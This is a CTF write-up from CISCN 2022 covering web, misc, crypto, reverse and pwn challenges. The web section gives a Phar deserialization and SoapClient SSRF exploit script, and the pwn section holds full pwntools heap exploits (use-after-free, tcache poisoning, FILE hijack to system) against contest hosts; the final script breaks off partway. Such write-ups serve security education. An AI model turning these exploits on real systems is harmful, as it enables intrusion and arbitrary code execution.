---
title: 'CISCN 2022: BxsTeam’s challenge notes'
translation_id: ciscn-2022
source_digest: adc2d0143efd4b3878e102bdb77ae97bdd6f6f31253ad356d4b54e9acc6c2f31
tags:
  - Web
  - Misc
  - Crypto
  - Reverse
  - Pwn
categories:
  - Cybersecurity
  - CTF
sections: {"a-secret-in-memory": "内存中的secret"}
---

## web

### 1.welcomeToCiscn

http://192.168.166.147:58005/flag

![image-20220626093945836](https://res.cloudinary.com/sycamore/image/upload/v1792696513/Typora/2022/06/fdc13e831337fd37296da62226314d5c.png)

`flag{61ee5435b6f59d42329ac2644d887dc2}`

### 2.ezphp


The prompt said a web player could solve this one with QQ. Flags used the format `flag{xxxx}`. The host was the IP returned by get_ip on the web template machine, on port 58003.

http://192.168.166.147:58003

Opening the challenge redirected me to Tencent’s website. I couldn’t see the challenge’s original response in the browser’s Network tab, so I switched to Burp.

![image-20220626194519069](https://res.cloudinary.com/sycamore/image/upload/v1792696512/Typora/2022/06/71b04071868e94c14ab68545511866d3.png)

Burp showed requests going to www.qq.com. I changed the destination address and the Host header by hand.

![image-20220626194841691](https://res.cloudinary.com/sycamore/image/upload/v1792696513/Typora/2022/06/404af43648ff7e40324818cb9d0a9580.png)

![image-20220626195032081](https://res.cloudinary.com/sycamore/image/upload/v1792696516/Typora/2022/06/6196e0859e1cc306b89e66254f983d62.png)

This time I reached a file upload interface. Visiting `upload.php` returned the source, with some characters HTML-encoded.

![image-20220626195647524](https://res.cloudinary.com/sycamore/image/upload/v1792696516/Typora/2022/06/128a44607394d2e48e0b6fa71a7ac246.png)

Saving the response as a local HTML page and opening it gave me the source:

upload.php

```php
 <?php
highlight_file(__FILE__);
header("content-type:text/html;charset=utf-8");  //设置编码
error_reporting(0);
include "config.php";
ini_set("max_execution_time","5");
//flag in flag.php
if(strlen($_FILES['file']['tmp_name'])>0){
    $filetype = $_FILES['file']['type'];
    $tmp = $_FILES['file']['tmp_name'];
    $content=file_get_contents($tmp);
    if (preg_match("/<\?|php/i", $content )){
        echo "go away!!!! hacker";
        exit();
    }
    $filepath="storage/";

    if( $filetype=="image/gif" ){
        $random_name=substr(md5(time()), 0, 8);
        if(move_uploaded_file($tmp,$filepath.$random_name.".gif")){
            echo "上传成功:路径在: ./".$filepath.$random_name.".gif";
        }else{
            echo "上传失败";
        }
    }
    else{
        echo "invalid gif";
    }
}
function checkimg($img){
    $check=getimagesize($img);
    if (($check!=false) && ($check['mime'] == 'image/gif')){
        echo "safe image";
    }
    else{
        echo "go away hacker";
    }
}

$img=$_GET["img"];
if (isset($img)){
    checkimg($img);
}
```

config.php

```php
<?php
highlight_file(__FILE__);
class Mysql{
    public $conn;
    public $dbhost;
    public $dbusername;
    public $dbpasswd;

    public function __construct()
    {
        if(isset($_POST['dbhost'])&&isset($_POST['dbusername'])&&isset($_POST['dbpasswd']))
        {
            $this->dbhost=$_POST['dbhost'];
            $this->dbusername=$_POST['dbusername'];
            $this->dbpasswd=$_POST['dbpasswd'];
        }
    }

    public function connect()
    {
        $this->conn=new mysqli($this->dbhost,$this->dbusername,$this->dbpasswd);
        if($this->conn->connect_error)
        {
            echo "Connection failed: {$this->conn->connect_error}";
            return False;
        }
        $result=$this->conn->query("select * from test");
        if(is_resource($result))
        {
            return $result->fetch_assoc();
        }
        else
        {
            return False;
        }
    }

    public function __destruct()
    {
        $this->conn->close();
    }
}


```

The hint mentioned flag.php. Visiting it returned its source as well:

```php
<?php
if ($_SERVER['REMOTE_ADDR'] == "127.0.0.1"){
    file_put_contents("flag.txt",$flag);
}
```

My notes on the source:

1. upload.php
   1. If the content type was `image/gif` and the regex did not match a PHP opening tag or the letters php, the program saved the upload as `storage/xxxxxxxx.gif`.
   2. With an img parameter it called `getimagesize` to inspect the image.
2. config.php
   1. There was just one class, Mysql.
   2. Its connect method wasn’t usable here. Its destructor was: it called `$this->conn->close();`.
3. flag.php
   1. This copied the flag into flag.txt, but only for a request originating on the local machine.

How I approached it:

1. The end goal was for `127.0.0.1` to request `flag.php`.
2. Seeing the PHP filter alongside `getimagesize` made me think of Phar deserialization.
3. Mysql supplied the class to deserialize. For the SSRF step I looked at the built-in SoapClient class: the destructor’s call to close on conn would invoke SoapClient’s __call method.

That gave me the following sequence:

1. Build a Mysql object whose conn member is a SoapClient pointing to `http://127.0.0.1/flag.php`.
2. Store the object in a Phar archive’s metadata.
3. Compress the original Phar as .tar.gz to get past the regex.

Here’s the script I used:

```php
<?php
class Mysql
{
    public $conn;
    public $dbhost;
    public $dbusername;
    public $dbpasswd;

    public function __construct($conn, $dbhost, $dbusername, $dbpasswd)
    {
        $this->conn = $conn;
        $this->dbhost = $dbhost;
        $this->dbusername = $dbusername;
        $this->dbpasswd = $dbpasswd;
    }
    public function __destory(){
        @system("calc");
        $this->conn->clase();
    }
}

$soap = new SoapClient(null,array("location"=>"http://127.0.0.1/flag.php","uri"=>"http://127.0.0.1/flag.php"));
$mysql=new Mysql(
    $soap,
    "xxx",
    "xxx",
    "xxx",
);


$ser=$mysql;
@unlink("phar.gif");
$phar = new Phar("phar.phar");
$phar = $phar->convertToExecutable(Phar::TAR,Phar::GZ);
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($ser);
$phar->addFromString("f1ag.txt","f1ag{PharData}");
$phar->stopBuffering();
@system("move phar.phar.tar.gz phar.gif");
@system("ls|findstr phar");
include("phar://./phar.gif/f1ag.txt");

```

Running it produced phar.gif and printed its contents. The resulting file contained no byte sequence that matched the filter.

I used this form to upload it to the challenge:

```html
<html lang="en">
<body>
<form action="http://192.168.166.147:58003/upload.php" name="name" method="post" enctype="multipart/form-data" target="">
    file:<input type="file" name="file">
    <br>
    <input type="submit" value="提交">
</form>
</body>
</html>
```

![image-20220626202551241](https://res.cloudinary.com/sycamore/image/upload/v1792696517/Typora/2022/06/928bc6b5a4b37ece34945ec48f050563.png)

After the upload the browser landed on /upload.php, which showed the stored file’s address.

![image-20220626202710848](https://res.cloudinary.com/sycamore/image/upload/v1792696517/Typora/2022/06/8604d2a808d2a95033b7e47354f02a32.png)

Opening that path through the phar wrapper triggered deserialization.

http://192.168.166.147:58003/upload.php?img=phar://./storage/ae08a63f.gif

![image-20220626203123372](https://res.cloudinary.com/sycamore/image/upload/v1792696521/Typora/2022/06/857640a3f076370e147a02fa7830303b.png)

SoapClient requested /flag.php and the flag was written into flag.txt. The file wasn’t really a GIF, so the condition failed and the response said “go away hacker”. By then I could just open flag.txt.

http://192.168.166.147:58003/flag.txt

![image-20220626203336153](https://res.cloudinary.com/sycamore/image/upload/v1792696523/Typora/2022/06/111191a5c9016190e8b5bcab43d52be6.png)

##

## MISC

### pika
`flag` ： `flag{d6246d1f41fad032ee30193f3af15408}`
The least significant bit planes of the RGB channels looked unusual. Exporting the extracted bits gave a text file.
Here’s the extracted content:
> cGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYSBwaXBpIHBpIHBpcGkgcGkgcGkgcGkgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaXBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpY2h1IHBpY2h1IHBpY2h1IHBpY2h1IGthIGNodSBwaXBpIHBpcGkgcGlwaSBwaXBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIGthIHBpa2FjaHUga2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaWthY2h1IHBpIHBpIHBpa2FjaHUgcGlwaSBwaWthY2h1IHBpY2h1IGthIGthIGthIGthIGthIHBpa2FjaHUgcGlwaSBwaSBwaSBwaWthY2h1IHBpY2h1IHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaSBwaSBwaSBwaWthY2h1IHBpY2h1IGthIHBpa2FjaHUgcGkgcGkgcGkgcGlrYWNodSBrYSBwaWthY2h1IHBpcGkgcGkgcGlrYWNodSBwaWthY2h1IHBpY2h1IHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpIHBpa2FjaHUgcGljaHUgcGlrYWNodSBwaXBpIGthIGthIGthIGthIGthIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBwaWNodSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpa2FjaHUga2EgcGlrYWNodSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaWthY2h1IA==

After Base64 decoding:
> pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pikachu pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pichu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka pikachu pi pi pikachu pi pi pikachu pipi pikachu pichu ka ka ka ka ka pikachu pipi pi pi pikachu pichu pi pi pi pikachu ka ka ka pikachu pipi pikachu ka ka ka ka ka pikachu pi pi pi pikachu pichu ka pikachu pi pi pi pikachu ka pikachu pipi pi pikachu pikachu pichu pi pikachu ka ka ka pikachu pi pikachu pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka pikachu pipi pi pikachu pichu pikachu pipi ka ka ka ka ka pikachu pi pi pi pi pi pikachu pichu ka ka pikachu pi pi pi pi pikachu ka pikachu ka ka ka ka pikachu pi pi pi pi pi pi pi pi pikachu pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu

I used the [Pikalang interpreter](https://www.dcode.fr/pikalang-language).
Interpreting the program gave the flag.
### A secret in memory
The challenge supplied two files, `secret.raw` and `yuijm0-=pkl;`.

I inspected the first file with `volatility -f secret.raw imageinfo`:
> Suggested Profile(s) : Win10x64_14393, Win10x64_10586, Win10x64, Win2016x64_14393

It was a memory image. The output also gave the operating system and suggested profiles.

In AXIOM I selected the Win10x64_14393 profile for the memory capture:
![image-20220626015056726](https://res.cloudinary.com/sycamore/image/upload/v1792696521/Typora/2022/06/e34c8c2bc8f3779902c6fc3ef8d6d26f.png)


Once processing finished, I browsed the recovered artifacts before deciding what to follow.
Under operating system artifacts, the Windows Timeline showed repeated use of VeraCrypt:
![image-20220626015040521](https://res.cloudinary.com/sycamore/image/upload/v1792696523/Typora/2022/06/3c5e8d2335b4749ed416a8374458b0d1.png)

Sorting web-related artifacts by descending date exposed several file records.
The interesting entries included virtual disks, flag.txt.txt, BitLocker recovery material, decrypt.png and secret.zip.
![image-20220626015035954](https://res.cloudinary.com/sycamore/image/upload/v1792696526/Typora/2022/06/858e96afc434419d85425864be03a11b.png)
The encryption artifacts contained five recovery-key files. Four contained a complete key, with three distinct values between them:
`109703-115929-085558-382888-715638-661716-466774-220858`
`172612-531773-032945-133364-584639-681373-481602-511291`
`109703-115929-085558-382888-715638-661716-466774-233200`

Given the VeraCrypt traces, I suspected the oddly named file was a disk container meant to be mounted with VeraCrypt.
The filenames in the web artifacts probably belonged to the next stages inside the disk.
I expected to need one of the BitLocker recovery keys for a file reached later.

The hint mentioned a keyboard password. Tracing the characters of the filename on the keyboard gave this pattern:
![image-20220626015029743](https://res.cloudinary.com/sycamore/image/upload/v1792696527/Typora/2022/06/e5efed00ab6006e2ec2efbfeb24d0dbf.png)

It looked like TZ. That was my candidate for the mount password.
Mounting the container revealed a virtual disk named `encrypt.vhd`.

In DiskGenius I chose Disk → Open virtual disk file and selected that VHD.
The volume was protected by BitLocker:
![image-20220626015024693](https://res.cloudinary.com/sycamore/image/upload/v1792696527/Typora/2022/06/f84d4415570a55914af21382e4c88d08.png)

Trying the three recovered values unlocked the volume and exposed `decrypt.png` and `secret.zip`:
![image-20220626015019970](https://res.cloudinary.com/sycamore/image/upload/v1792696530/Typora/2022/06/6a6c5ab814e6d331f41a18998a8a6ff8.png)

The ZIP was password-protected. The name decrypt.png suggested the image contained its password.
![image-20220626015015401](https://res.cloudinary.com/sycamore/image/upload/v1792696531/Typora/2022/06/70720bc6a39d9eab22e5f340a1829e4c.png)

The text “a tribute to babydisk” referred back to a qualifying-round challenge. The key word in its write-up was “spiral”.
Starting in the upper-right corner and reading the radicals clockwise gave: `⼃⼇⼋⼏⼎⼍⼌⼈⼄⼀⼁⼂⼆⼊⼉⼅`.
Copying the Unicode characters from Wikipedia and using 7-Zip worked.
The precise code points mattered. Characters typed with an input method could look right and still fail.

The extracted flag.txt contained:
![image-20220626015010492](https://res.cloudinary.com/sycamore/image/upload/v1792696531/Typora/2022/06/3a481abbd31dbb4dba5468a45f209de5.png)

I used this script to decode it:
```python
import base64

def base64stego_decrypt(lines):
    base64char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    bintext = ""
    for line in lines:
        if line.find("==") > 0:
            tmp = bin(base64char.find(line[-3]) & 15)[2:]
            bintext = bintext+"0"*(4-len(tmp))+tmp
        elif line.find("=") > 0:
            tmp = bin(base64char.find(line[-2]) & 3)[2:]
            bintext = bintext+"0"*(2-len(tmp))+tmp
    text = ""
    if(len(bintext) % 8 != 0):
        print("error")
        for i in range(0, len(bintext), 8):
            if(i+8 > len(bintext)):
                text = text+"-"+bintext[i:]
                return text
            else:
                text = text+chr(int(bintext[i:i+8], 2))
    else:
        for i in range(0, len(bintext), 8):
            text = text+chr(int(bintext[i:i+8], 2))
        return text

if __name__ == "__main__":
    path = "flag.txt"
    file = open(path, "r")
    line = file.read().splitlines()
    print(base64stego_decrypt(line))
```
Result: `MemoRy_S1cr1t`.

## CRYPTO
### eazy
`flag` : `flag{a9462922e5da8ef93d213c33168881c5}`

Base64 decoding the supplied data gave:
svciqytf10r3ln!nule7
I reversed a three-rail zigzag transposition:
syntvfu1c0lri3elqn7!
Then I tried the Caesar shifts:
```python
model = "abcdefghijklmnopqrstuvwxyz"
model2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

str1 = "syntvfu1c0lri3elqn7!"

for key in range(1,27):
    for s in str1:
        if s.islower():
            n = model.find(s)
            s = model[n-key]
        elif s.isupper():
            n = model2.find(s)
            s = model2[n-key]
        print(s, end='')
    print('')
```
The result was:
`flagish1p0yev3ryda7!`
Read with spaces: “flag is h1p0yev3ryda7!”.
The flag body was the lowercase 32-character MD5 digest of `h1p0yev3ryda7!`.

### RunFaster
`flag` : `flag{0ed7bc5c61e32c10e082abd2b5589a22}`

ciphertext.txt contained aligned hexadecimal strings. Converting them to characters produced no obvious text. There were no other hints. I’d seen a similar puzzle involving reuse of a one-time pad, and that reading seemed to fit the name RunFaster. I adapted the script from [this many-time-pad attack write-up](https://www.ruanx.net/many-time-pad/) to recover the key.

Here’s the many-time-pad script:

```python
import Crypto.Util.strxor as xo
import libnum, codecs, numpy as np

def isChr(x):
    if ord('a') <= x and x <= ord('z'): return True
    if ord('A') <= x and x <= ord('Z'): return True
    return False

def infer(index, pos):
    if msg[index, pos] != 0:
        return
    msg[index, pos] = ord(' ')
    for x in range(len(c)):
        if x != index:
            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(' ')

dat = []

def getSpace():
    for index, x in enumerate(c):
        res = [xo.strxor(x, y) for y in c if x!=y]
        f = lambda pos: len(list(filter(isChr, [s[pos] for s in res])))
        cnt = [f(pos) for pos in range(len(x))]
        for pos in range(len(x)):
            dat.append((f(pos), index, pos))

c = [codecs.decode(x.strip().encode(), 'hex') for x in open('Problem.txt', 'r').readlines()]

msg = np.zeros([len(c), len(c[0])], dtype=int)

getSpace()

dat = sorted(dat)[::-1]
for w, index, pos in dat:
    infer(index, pos)

print('\n'.join([''.join([chr(c) for c in x]) for x in msg]))
```

The output was:

![](https://res.cloudinary.com/sycamore/image/upload/v1792696532/Typora/2022/06/fe48ad2860db212c649751149211d71d.png)

Some plaintext became recognisable. From the last line I guessed the ending `e  were neither up nor down. OK`. XORing a candidate plaintext with its ciphertext yields a candidate key.

```python
s=bytes.fromhex('32397f47102d3c101b3a2a34063a2013354111173036600a0c44314c602d32')
txt="e  were neither up nor down. OK"
for i in range(len(s)):
    print(chr(ord(txt[i])^s[i]),end='')
#W_0u_Y0u_C@n_R3@11y_D@nc3_b@by
print()
print(chr(int('25',16)^ord('e')))
#W@_0u_Y0u_C@n_R3@11y_D@nc3_b@by
```

One character was still unresolved. Comparing the first line with “they” in the fourth line from the end filled it in. I then XORed all the ciphertexts with the recovered key.

![image-20220626211840330](https://res.cloudinary.com/sycamore/image/upload/v1792696534/Typora/2022/06/ff1f317976f4a27903d448b1ab4c8a29.png)

The recovered key opened the archive. The next stage provided a dictionary and salted hashes. I hashed candidates with the corresponding salt and compared the results.

```python
from passlib.hash import md5_crypt
f=open(r'C:\Users\lx\Desktop\分区赛\密码\minirockyou.txt','r')
enc='$1$ciscn010$mSuTlV75nZZGGjoayF/nS0'
while True:
    s=f.readline().replace('\n','')
    if enc in md5_crypt.hash(s,salt='ciscn010'):
        print(s)
        break
```

The individual candidates were short enough to update enc and salt manually for each one. This produced a plaintext string.

```python
m="the second letter of each word in this list in order" #取出这些单词的第二个字符
m=m.split(' ')
str=''
for i in range(len(m)):
    str+=m[i][1]
print(str)
#heefaonhinr
#flag{0ed7bc5c61e32c10e082abd2b5589a22}
```

Wrapping that text directly in the flag format failed. The other flag bodies were 32 hexadecimal characters, so I tried the MD5 digest of `heefaonhinr`. That worked :)

## RE

### crackme2

`flag` : `flag{50c418de67942e713517e900dbd12183}`

For this Android reversing puzzle I opened the app in JADX and inspected main1Activity. The main function was:
```java
    public native String stringFromJNI(String str);

    static {
        System.loadLibrary("crackme2");
    }

    public static boolean checkFmt(String input) {
        for (int i = 0; i < input.length(); i++) {
            if (Character.isUpperCase(input.charAt(i))) {
                return false;
            }
        }
        return true;
    }


    public /* synthetic */ void m0lambda$onCreate$0$comctfcrackme2Main1Activity(EditText et_input, View v) {
        String input = et_input.getText().toString();
        if (input.startsWith("flag{") && input.endsWith("}") && input.length() > 6 && input.length() < 39 && checkFmt(input)) {
            Toast.makeText(this, stringFromJNI(input.substring(5, input.length() - 1)), 0).show();
        }
    }
```
The app first checked the format and length. checkFmt rejected uppercase input; the call to stringFromJNI then moved the main check into the native library. I unpacked the APK, loaded the x86 shared library into IDA and checked its exports. The JNI function was statically registered, so I adjusted its parameters as shown below.


![image-20220626201210787](https://res.cloudinary.com/sycamore/image/upload/v1792696535/Typora/2022/06/35f672f500d43444bd5231a0a8c258b7.png)

The native function checked for 32 characters before passing the input to sub_D1FE5640.

![image-20220626201406417](https://res.cloudinary.com/sycamore/image/upload/v1792696535/Typora/2022/06/106131f536b262650aa3b590534a0514.png)

It read a serialised object from tmp for use in encryption. sscanf then parsed pairs of hexadecimal characters into a byte array: the 32-character input represented 16 bytes.

![image-20220626201917396](https://res.cloudinary.com/sycamore/image/upload/v1792696535/Typora/2022/06/04108af78a95bd369ca3ba2f1a87376d.png)

The native code called the encrypt method on com/risid/test/AESEncrypt and used SetByteArrayRegion to pass data to Java. I found the definition of `encrypt` in JADX.

![image-20220626202135278](https://res.cloudinary.com/sycamore/image/upload/v1792696538/Typora/2022/06/cbb3b62057a98ec580c35b63d77d89f9.png)

The content argument was the parsed byte array. The IV was “0123456789abcdef”, and the third argument was the object recovered from tmp. This was AES in CBC mode. I needed the first 16 bytes of plaintext. I already had the IV, but I still needed the key.

![image-20220626203245330](https://res.cloudinary.com/sycamore/image/upload/v1792696539/Typora/2022/06/2cb8a1e069fa00e3c92f1926f902ca6e.png)

The key was in AESGenerator under com/risid/test. With that information I could test the decryption in Python.

```python
from Crypto.Cipher import AES
c=bytes([0x08, 0x32, 0x97, 0x4C, 0x9E, 0xE2, 0xDB, 0x44, 0x40, 0x92, 0x0B, 0x0F, 0x7C, 0x75, 0x00, 0x56, 0x7C, 0x13, 0xA3, 0xBF, 0xB4, 0x69, 0x5D, 0x88, 0xCE, 0x0B, 0x97, 0x78, 0x51, 0x05, 0x8A, 0xD9])
iv=b'0123456789abcdef'
key=bytes.fromhex('60aef077a3624ff7725b77dae4c6e004')
aes=AES.new(key,AES.MODE_CBC,iv)
m=aes.decrypt(c)
for i in range(16):
    print(hex(m[i])[2:].zfill(2),end='')
#flag{50c418de67942e713517e900dbd12183}
```

### easycry

This was the introductory reversing task. Exeinfo showed an unpacked 64-bit ELF, which I opened in IDA64.

`flag` ： `flag{061cc4091400c082234a57034ed05cf2}`

![image-20220626204320327](https://res.cloudinary.com/sycamore/image/upload/v1792696539/Typora/2022/06/c61d07c934a61164fc0d92c28ff9d3ad.png)

FindCrypt identified an AES S-box. The main function made the overall flow fairly clear.

![image-20220626204531962](https://res.cloudinary.com/sycamore/image/upload/v1792696539/Typora/2022/06/f8cec6059657af8083a6574724aef7e0.png)

v5 held the 32-byte AES key, ptr the expanded key. sub_1DC5 performed key expansion and sub_2181 encrypted two 16-byte blocks in ECB mode, so the recorded ciphertext could be decrypted directly.

```python
from Crypto.Cipher import AES
k=bytes([0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F])
aes=AES.new(k,AES.MODE_ECB)
c=bytes([0x32, 0x59, 0x1D, 0xED, 0xBA, 0xAC, 0x5D, 0x48, 0xCE, 0x1E, 0xBD, 0x8C, 0x43, 0xFA, 0x34, 0x5B, 0x9D, 0x6E, 0xBB, 0x25, 0xF9, 0x17, 0x59, 0x31, 0xDE, 0x20, 0x36, 0xB9, 0x5B, 0xB5, 0x72, 0x5B])
print(aes.decrypt(c))
#flag{061cc4091400c082234a57034ed05cf2}
```


## PWN
### duck

![image-20220626194732802](https://res.cloudinary.com/sycamore/image/upload/v1792696543/Typora/2022/06/b330caffb4d582c144c2e06d22eb3057.png)

**`flag{693edf4763ef4cdd4f152794028b7f5e}`**

This libc 2.34 challenge had a straightforward **use-after-free** and an Edit operation. Together they gave us a shell.

**Approach**

1. Use the dangling pointer to leak a heap address, then allocate and delete several chunks to leak libc.
2. Allocate a chunk over the tcache entries and use Edit to control subsequent allocations.
3. Replace the flags field of stderr with `/bin/sh\0`.
4. Replace the function pointer in _IO_file_jumps with system. Changing the top chunk’s size then reaches _IO_fflush and gives a shell.

**Exp**

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *
from LibcSearcher import *

se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{ {print \x241} }\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./pwn')
context(arch = elf.arch, os = 'linux',log_level = 'debug',terminal = ['tmux', 'splitw', '-hp','62'])
# p = process('./pwn')
# debug()
p = remote('192.168.166.147',58013)

def menu(c):
    sla('Choice: ',str(c))

def add():
    menu(1)

def dele(id):
    menu(2)
    sla('Idx: ',str(id))

def show(id):
    menu(3)
    sla('Idx: \n',str(id))

def edit(id,data,size=0x100):
    menu(4)
    sla('Idx: ',str(id))
    sla('Size: ',str(size))
    sea('Content: ',str(data))


add()
dele(0)
show(0)
heap_leak = uu64(ru('\n'))
heap_base = heap_leak <<12
lg('heap_leak',heap_leak)
lg('heap_base',heap_base)

for i in range(10):
    add() # 9

for i in range(1,2+8):
    dele(i)
show(8)
libc_leak = uu64(ru('\x7f',drop=False)[-6:])
libc_base = libc_leak - 0x1f2cc0
lg('libc_leak',libc_leak)
lg('libc_base',libc_base)
#libc = ELF('./libc.so.6')
libc = elf.libc
libc.address = libc_base
system_addr = libc.sym.system
bin_sh = libc.search('/bin/sh').next()

stderr = libc_base + 0x1f3680
helper = libc_base + 0x1f45c0

edit(7,p64(heap_leak^(heap_base+0x100)))
add() # 11
# pause()
add() # 12
edit(12,p64(stderr)*2)
lg('ADDR',(heap_base+0x100))
add() # 13
edit(13,'/bin/sh\0')
edit(12,p64(helper)*2)
add()
edit(14,p64(system_addr))
for i in range(3):
    edit(12,p64(heap_base+0xd30)*2)
    add()
    edit(15,p64(0)*2)

add()
add()
add()

# add()

p.interactive()
```

### bigduck

![image-20220626194814107](https://res.cloudinary.com/sycamore/image/upload/v1792696543/Typora/2022/06/fd8d10ea967cd9e8e58b8c6e824fdcd2.png)

**`flag{afae47ead2452a4b5ba629ec88635a51}`**

This sandboxed heap challenge used libc 2.33. Otherwise it was much like the previous one.

**Approach**

1. Leak the heap address through the dangling pointer, then allocate and delete several chunks to leak libc.
2. Allocate over the tcache entries and use Edit to control where a chunk is allocated.
3. Use House of Kiwi for the stack pivot, then execute the shellcode to read the flag.

**exp**

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *
from LibcSearcher import *

se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{ {print \x241} }\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./pwn')
context(arch = elf.arch, os = 'linux',log_level = 'debug',terminal = ['tmux', 'splitw', '-hp','62'])
# p = process('./pwn')
# debug()
p = remote('192.168.166.147',58011)

def menu(c):
    sla('Choice: ',str(c))

def add():
    menu(1)

def dele(id):
    menu(2)
    sla('Idx: ',str(id))

def show(id):
    menu(3)
    sla('Idx: \n',str(id))

def edit(id,data,size=0x100):
    menu(4)
    sla('Idx: ',str(id))
    sla('Size: ',str(size))
    sea('Content: ',str(data))


add()
dele(0)
show(0)
heap_leak = uu64(ru('\n'))
heap_base = heap_leak <<12
lg('heap_leak',heap_leak)
lg('heap_base',heap_base)

for i in range(10):
    add() # 9

for i in range(1,2+8):
    dele(i)
edit(8,'u')
show(8)
libc_leak = uu64(ru('\x7f',drop=False)[-6:])
libc_base = libc_leak - 0x1e0c75
lg('libc_leak',libc_leak)
lg('libc_base',libc_base)
#libc = ELF('./libc.so.6')
libc = elf.libc
libc.address = libc_base
system_addr = libc.sym.system
bin_sh = libc.search('/bin/sh').next()
edit(8,'\0')

stderr = libc_base + 0x1f3680
sync = libc_base + 0x1e24a0 + 0x60
magic = libc_base + 0x529ad
helper = libc_base + 0x1e1940
ret = libc_base + 0x0000000000026699
rdi = libc_base + 0x0000000000028a55
